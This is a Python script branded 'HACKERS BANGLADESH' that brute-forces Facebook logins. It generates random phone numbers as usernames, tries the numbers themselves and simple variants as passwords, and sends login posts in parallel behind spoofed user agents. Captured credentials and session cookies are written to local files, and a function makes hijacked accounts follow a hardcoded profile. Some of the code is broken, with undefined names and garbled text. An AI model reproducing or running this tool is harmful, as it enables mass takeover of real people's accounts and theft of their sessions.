#create by ZIHAD HOSSAIN RAFI
#github.com/MR-ZIHAD

import os

B="\033[1;34m"        # Blue
O="\033[0m"       # Text Reset
P="\033[1;35m"      # Purple
R="\033[1;31m"         # Red
G="\033[1;32m"       # Green
Y="\033[1;33m"      # Yellow
C="\033[1;36m"        # Cyan  
Bl="\033[1;30m"      #Black

try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,uuid
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python num.py')

#_____________Texts___________#
def s_text(t):
  for e in t:
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.003)
  print("")

class printer:
  def __init__(self,x):
    for e in x + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.003)

'''
Mozilla/5.0 (Linux; Android 9; Gravity_6P Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36
'''


ugen=[]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

done = False
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for xd in range(3005):
    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
    uas.append(ff)
for spy in range(9993,176281):
    aa='Mozilla/5.0 (Linux; Android 10'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='TRT-L53 Build/HUAWEITRT-L53; wv)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.5304.141 Mobile Safari/537.36;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    



for xc in range(10000):
    rr=random.randint
    xd=f"Opera/9.80 (Android; Opera Mini/12.0.{str(rr(999,1999))}/{str(rr(19,49))}.{str(rr(6000,8000))}; U; en) Presto/2.12.423 Version/12.16"
    ugen.append(xd)
    
#id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
#cokbrut=[]
#pwpluss,pwnya=[],[]


agents = ('Mozilla/5.0 (Linux; U; Android 2.1-2010.11.4; de-de; XST2 Build/ECLAIR) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
    'Moilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A125U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',
    'Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
 'Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S8500/S8500XXJL2; U; Bada/1.2; fr-fr) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/2.2 Mobile WVGA SMM-MMS/1.2.0 OPN-B',
'Mzilla/5.0 (Linux; U; Android 2.2.1; en-us; MB525 Build/3.4.2-107_JDN-9) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozill a/5.0 (Linux; U; Android 2.1-update1-1.0.19; en-us; NXM736 Build/ECLAIR) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17',
'Mozilla/5.0 (Linux; U; Android 2.2; de-de; U0101HA Build/FRF85B) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 2.2.1; de-de; SP-60 Build/MASTER) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 2.2; en-gb; ViewPad7 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
'Mozilla/4.08 (Windows; Mobile Content Viewer/1.0) NetFront/3.2',)

logo = ("""\033[1;92m
.______      .___  ___.      ___      ___   ___ 
|   _  \     |   \/   |     /   \     \  \ /  / 
|  |_)  |    |  \  /  |    /  ^  \     \  V  /  
|      /     |  |\/|  |   /  /_\  \     >   <   
|  |\  \----.|  |  |  |  /  _____  \   /  .  \  
| _| `._____||__|  |__| /__/     \__\ /__/ \__\  
 \033[1;92m   | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;31;1m \033[1;92m [💔︎] \033[1;92;1mAuthor    :  \033[1;92m ZIHAD HOSSAIN RAFI           \033[1;31;1m
\033[1;31;1m \033[1;92m [💔︎] \033[1;92;1mWhatsapp  :  \033[1;92m 8801842827520          \033[1;31;1m
\033[1;31;1m \033[1;92m [💔] \033[1;92;1mGitHub    : \033[1;92m  MR-ZIHAD       \033[1;31;1m
\033[1;31;1m \033[1;92m [💔︎] \033[1;92;1mTEAM      :  \033[1;92m STRIKER\033[1;31;1m
\033[1;31;1m \033[1;92m [💔] \033[1;92;1mVersion   :  \033[1;92m MAX                  \033[1;31;1m
\033[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
\33[1;92m [+] TURN ON & OFF AEROPLANE MODE BEFORE USE√
\033[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••""")

loop = 0
oks = []
cps = []

#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)


def menu():
    os.system('clear')
    print(logo)
    #print(47*"-")
    printer(f' {G}[1] RANDOM CRACK')
    printer(f"{G} [0] EXIT")
    #print(47*"-")
    print("")
    opt = input(f' {G}[+] MENU :{G} ')
    if opt in ['1',"01","A","a"]:
      random_crack()
    if opt in ["0","00","e","E"]:
      exit()
    else:
     menu()

def cek_apk(coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Â®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
            
def follow(self, session, coki):
  r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {'cookie': coki }, **('cookies',)).text, 'html.parser')
  get = r.find('a', 'Ikuti', **('string',)).get('href')
  session.get('https://free.facebook.com' + str(get), {'cookie': coki }, **('cookies',)).text

try:
    key1=open("/storage/emulated/0/android8.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/android8.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="RAFI-allahuakbar1971"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)

a=requests.get("https://github.com/MR-ZIHAD/Approved/blob/main/Approved.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
    
else:
    os.system("clear")
    print(logo)
    print("\n\033[1;92mYour key  : "+key2)
    print("\n\033[1;92mContact Admin ")
    os.system("xdg-open https://facebook.com/zihad.hossain36")
    exit()

def random_crack():
    os.system('clear')
    print(logo)
    #print(47*"-")
    s_text(' [1] BANGLADESH')
    s_text(f' {G}[0] BACK')
    #print(47*'-')
    print("")
    opt = input(f' {G}[+] MENU :{G} ')
    if opt in ["1","01","a","A"]:
        random_number()
    elif opt in ["0","00","e","E"]:
        menu()
    else:
        print("")
        s_text(f' {G}Choose a valid option\033[0;97m')
        time.sleep(3)
        random_crack()

def random_number():
    user=[]
    os.system('clear')
    print(logo)
    print(47*"•")
    s_text(' [+] ENTER FOUR DIGIT CODE : EXAMPLE: 017, 018')
    print(47*'•')
    kode = input(f' {G}[+] CODE :{G} ')
    print(47*'•')
    s_text(f" [+] LIMIT : EXAMPLE: 2000, 3000, 50000, 100000  ")
    print(47*"•")
    limit = int(input(f' {G}[+] LIMIT:{G} '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [+] TOTAL IDS : \033[1;92m'+tl)
        print(f' {G}[+] BRUTE HAS BEEN STARTED...(\033[1;92mBANGLADESH\033[1;92m)');print(47*"•");print('    USE (\033[1;92mAEROPLANE\033[1;92m) MODE BEFORE USE');print(47*"•")

        for guru in user:
            uid = kode+guru
            mk = uid[3:]
            pwx = [kode+guru,mk]
            yaari.submit(rcrack,uid,pwx,tl)

    print("")
    print(47*"•")
    print(f' {G}[+] CRACK PROCESS HAS BEEN COMPLETED')
    print(f' {G}[+] IDS SAVED IN ok.txt,cp.txt')
    print(47*"•")
    input(f' {G}PRESS INTER TO BACK MENU')
    menu()


def random_pak_number():
    user=[]
    os.system('clear')
    print(logo)
    print(47*"-")
    print(' [+] For PAK CODE(92301) For AFG CODE(93780) ETC...')
    print(47*'-')
    kode = input(' [+] CODE : ')
    print(47*'-')
    limit = int(input(' [+] HOW MANY NUMBERS TO ADD 1000,5000,100000: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [+] Total Ids : \033[1;92m'+tl)
        print(' \033[1;32;1m[$] BRUTE HAS BEEN STARTED...(\033[1;92mPAK-AFG\033[1;92m)');print(47*"-");print('    USE FLIGHT (\033[1;92mAEROPLANE\033[1;92m) MODE BEFORE USE');print(47*"-")

        for guru in user:
            uid = kode+guru
            pwx = [guru[2:]]
            pwx.append = ('Bangladesh,i love you,abal')
            #nmm = Bangladesh
            yaari.submit(rcrack,uid,pwx,tl)

    print(47*"-")
    print(' [+] CRACK PROCESS HAS BEEN COMPLETED')
    print(' [+] IDS SAVED IN ok.txt,cp.txt')
    print("")
    print(47*"-")
    input(' PRESS ENTER TO BACK MENU')
    os.system("python RMAX.py")

def rcrack(uid,pwx,tl):
	global loop
	global oks 
	global cps
	global agents

	try:
		for ps in pwx:
		  session = requests.Session()
		  ua = random.choice(ugen)
		  free_fb = session.get('https://mbasic.facebook.com').text
		  log_data = {
		    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
		    "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
		    "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
		    "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
		    "try_number":"0",
		    "unrecognized_tries":"0",
		    "email":uid,
		    "pass":ps,
		    "login":"Log In"}
		    
		  header_freefb = {
			'authority': 'mbasic.facebook.com',
			'method': 'GET',
			'path': '/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://www.facebook.com/',
			'sec-ch-ua': '"Google Chrome";v="107", "Not)A;Brand";v="24", "Chromium";v="105"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': ua,}
		    
		  
		  lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
		  
		  
		  log_cookies=session.cookies.get_dict().keys()
		  #print(iid+'|'+pws+'|'+str(log_cookies))
		  
		  if 'c_user' in log_cookies:
		    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
		    
		    cid = coki[151:166]
		    print(f'\r  {G}[RAFI-OK] '+cid+' | '+ps )
		    print(f'\r\033[1;92m [RAFI] COOKIE : '+coki)
		    #cek_apk(coki)
		    open('ok.txt', 'a').write(uid+' | '+ps+'\n')
		    oks.append(uid)
		    
		    break
		  
		  elif 'checkpoint' in log_cookies:
		    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
		    
		    cid = coki[141:156]
		    
		    print(f'\r  {R}[RAFI-CP] '+cid+' | '+ps )
		    #print(f'\r\033[1;92m [RAFI] COOKIE : '+coki)
		    open('cp.txt', 'a').write(cid+' | '+ps+'\n')
		    cps.append(cid)
		    break
		  else:
		    continue
		loop+=1
		sys.stdout.write(f"\r  [ RAFI ] {G}[{loop}|{tl}] {G}[OK][{len(oks)}] [CP][{len(cps)}]  "),
		sys.stdout.flush()

	except:
		pass
if __name__=='__main__':
  menu()
